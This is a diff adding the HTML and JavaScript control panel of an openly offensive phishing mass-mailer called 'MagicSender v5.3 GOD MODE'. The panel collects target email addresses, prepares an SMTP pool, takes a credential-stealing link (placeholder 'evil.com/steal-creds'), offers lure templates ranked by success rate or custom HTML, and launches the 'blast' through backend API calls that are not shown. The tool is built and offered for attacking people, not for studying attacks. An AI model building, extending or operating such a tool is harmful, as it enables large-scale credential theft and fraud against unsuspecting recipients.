@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎯 MagicSender v5.3 GOD MODE</title>
+  <style>
+    *{font-family:'Courier New',monospace;background:#000;color:#0f0;margin:0;padding:0;box-sizing:border-box;}
+    body{max-width:1400px;margin:0 auto;padding:20px;background:linear-gradient(135deg,#000 0%,#111 100%);}
+    .header{text-align:center;margin-bottom:30px;padding:20px;border:2px solid #0f0;border-radius:10px;}
+    h1{color:#f00;font-size:2.5em;margin-bottom:10px;}
+    h2{color:#ff0;font-size:1.3em;}
+    .container{display:grid;grid-template-columns:1fr 350px;gap:25px;margin-top:20px;}
+    input,textarea,select,button{width:100%;padding:12px;margin:8px 0;border:2px solid #0f0;background:#111;color:#0f0;font-family:inherit;border-radius:5px;}
+    button{background:#f00;cursor:pointer;font-weight:bold;text-transform:uppercase;}
+    button:hover{background:#ff0;color:#000;}
+    button:disabled{background:#333;cursor:not-allowed;}
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin:20px 0;}
+    .stat{text-align:center;padding:20px;border:2px solid #333;border-radius:8px;transition:all 0.3s;}
+    .stat:hover{border-color:#0f0;box-shadow:0 0 20px #0f0;}
+    .step{display:none;animation:fadeIn 0.5s;}.step.active{display:block;}
+    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+    .templates{max-height:300px;overflow-y:auto;border:2px solid #333;border-radius:8px;padding:10px;}
+    .template-item{padding:12px;border-bottom:1px solid #333;cursor:pointer;transition:background 0.2s;display:flex;justify-content:space-between;}
+    .template-item:hover{background:#222;}
+    .template-item.selected{background:#0f0;color:#000;}
+    .preview{background:#111;padding:20px;border:2px solid #0f0;border-radius:8px;min-height:200px;overflow:auto;max-height:250px;margin-top:10px;}
+    .progress{height:30px;background:#222;margin:15px 0;border:2px solid #0f0;border-radius:15px;overflow:hidden;}
+    .bar{height:100%;background:linear-gradient(90deg,#0f0,#ff0,#f00);transition:width 0.5s;position:relative;}
+    .bar::after{content:attr(data-percent)'%';position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#000;font-weight:bold;}
+    .stop-btn{background:#ff0;color:#000 !important;font-size:18px;padding:20px;margin-top:20px !important;}
+    .phishing-input{border-color:#f00 !important;}
+  </style>
+</head>
+<body>
+<div class="header">
+  <h1>🎯 MAGICSENDER v5.3 GOD MODE</h1>
+  <h2>PHISHING LINKS + STOP + CUSTOM HTML</h2>
+</div>
+
+<div class="container">
+  <!-- MAIN PANEL -->
+  <div>
+    <div id="step1" class="step active">
+      <h3 style="color:#ff0;">📧 STEP 1: TARGET EMAILS</h3>
+      <textarea id="emails" rows="6" placeholder="admin@target.com&#10;ceo@company.com&#10;..."></textarea>
+      <button onclick="nextStep(1)">🚀 HARVEST SMTP POOL</button>
+    </div>
+
+    <div id="step2" class="step">
+      <h3 style="color:#ff0;">🌐 STEP 2: SMTP READY</h3>
+      <div class="stats">
+        <div class="stat"><div>Providers</div><strong id="providers">0</strong></div>
+        <div class="stat"><div>Targets</div><strong id="leads">0</strong></div>
+        <div class="stat"><div>Campaigns</div><strong id="campaigns">0</strong></div>
+        <div class="stat"><div>Success</div><strong id="successRate">0%</strong></div>
+      </div>
+      <button onclick="nextStep(2)">💥 PREPARE BLAST</button>
+    </div>
+
+    <div id="step3" class="step">
+      <h3 style="color:#ff0;">💥 STEP 3: OBLITERATION</h3>
+      <div class="stats">
+        <div class="stat"><div>Sent</div><strong id="sent">0/0</strong></div>
+        <div class="stat"><div>Remaining</div><strong id="remaining">0</strong></div>
+        <div class="stat"><div>Bounced</div><strong id="bounced">0</strong></div>
+        <div class="stat"><div>Template</div><strong id="currentTemplate">-</strong></div>
+      </div>
+      <div class="progress"><div id="blastBar" class="bar" style="width:0%" data-percent="0"></div></div>
+      <button id="stopBtn" class="stop-btn" onclick="stopCampaign()" style="display:none;">⏹️ EMERGENCY STOP</button>
+    </div>
+  </div>
+
+  <!-- SIDEBAR: TEMPLATES + LINKS + EDITOR -->
+  <div style="position:sticky;top:20px;">
+    <h3 style="color:#f00;">🔗 YOUR PHISHING LINK</h3>
+    <input id="phishingLink" class="phishing-input" placeholder="https://evil.com/steal-creds" />
+    
+    <h3 style="color:#ff0;margin-top:20px;">🤖 AI TEMPLATES</h3>
+    <div class="templates" id="templateList"></div>
+
+    <h3 style="color:#ff0;margin-top:15px;">✏️ CUSTOM HTML</h3>
+    <textarea id="customHtml" rows="4" placeholder="Your custom HTML with {{PHISHING_LINK}} placeholder..."></textarea>
+
+    <h3 style="color:#ff0;margin-top:15px;">📱 LIVE PREVIEW</h3>
+    <div class="preview" id="preview">Enter phishing link + select template</div>
+
+    <button onclick="launchBlast()" style="margin-top:20px;font-size:16px;padding:20px;">
+      💥 LAUNCH TOTAL OBLITERATION
+    </button>
+  </div>
+</div>
+
+<script>
+let currentTemplate = 'verification';
+let blastActive = false;
+
+async function updateStats() {
+  try {
+    const res = await fetch('/api/stats');
+    const data = await res.json();
+    
+    document.getElementById('providers').textContent = data.providersActive;
+    document.getElementById('leads').textContent = data.leadsParsed;
+    document.getElementById('campaigns').textContent = data.campaigns;
+    document.getElementById('sent').textContent = `${data.stats.obliterated}/${data.stats.total}`;
+    document.getElementById('remaining').textContent = data.emailsRemaining;
+    document.getElementById('bounced').textContent = data.stats.bounced;
+    document.getElementById('currentTemplate').textContent = data.currentTemplate;
+    
+    const pct = data.stats.total ? (data.stats.obliterated/data.stats.total*100) : 0;
+    document.getElementById('blastBar').style.width = pct+'%';
+    document.getElementById('blastBar').setAttribute('data-percent', Math.round(pct));
+    
+    showStep(data.step);
+    document.getElementById('stopBtn').style.display = data.isRunning ? 'block' : 'none';
+    blastActive = data.isRunning;
+    
+  } catch(e) {}
+}
+
+function showStep(n) {
+  document.querySelectorAll('.step').forEach((el,i)=>el.classList.toggle('active', i+1===n));
+}
+
+async function nextStep(step) {
+  if(step===1){
+    const emails = document.getElementById('emails').value.trim();
+    if(!emails) return alert('Enter emails!');
+    await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({emails})});
+  } else if(step===2){
+    await fetch('/api/step2',{method:'POST'});
+  }
+  updateStats();
+}
+
+async function stopCampaign() {
+  await fetch('/api/stop',{method:'POST'});
+  blastActive = false;
+}
+
+async function launchBlast() {
+  if(blastActive) return alert('Already blasting!');
+  
+  const link = document.getElementById('phishingLink').value.trim();
+  const custom = document.getElementById('customHtml').value.trim();
+  
+  if(!link) return alert('Enter your phishing link!');
+  
+  const payload = { template: currentTemplate, phishingLink: link };
+  if(custom) payload.customHtml = custom;
+  
+  await fetch('/api/blast',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
+
+async function loadTemplates() {
+  const res = await fetch('/api/stats');
+  const {templates} = await res.json();
+  document.getElementById('templateList').innerHTML = 
+    Object.entries(templates).map(([k,v],i)=>`
+      <div class="template-item ${currentTemplate===k?'selected':''}" onclick="selectTemplate('${k}')">
+        <span>${i+1}.</span><strong>${v.name}</strong><span>${v.successRate}%</span>
+      </div>
+    `).join('');
+}
+
+async function selectTemplate(name) {
+  currentTemplate = name;
+  document.querySelectorAll('.template-item').forEach(el=>el.classList.remove('selected'));
+  event.target.classList.add('selected');
+  
+  const link = document.getElementById('phishingLink').value.trim();
+  const res = await fetch(`/api/templates/${name}?link=${encodeURIComponent(link)}`);
+  const {html} = await res.json();
+  document.getElementById('preview').innerHTML = html;
+}
+
+// STARTUP
+setInterval(updateStats, 1000);
+loadTemplates();
+updateStats();
+</script>
+</body>
+</html>
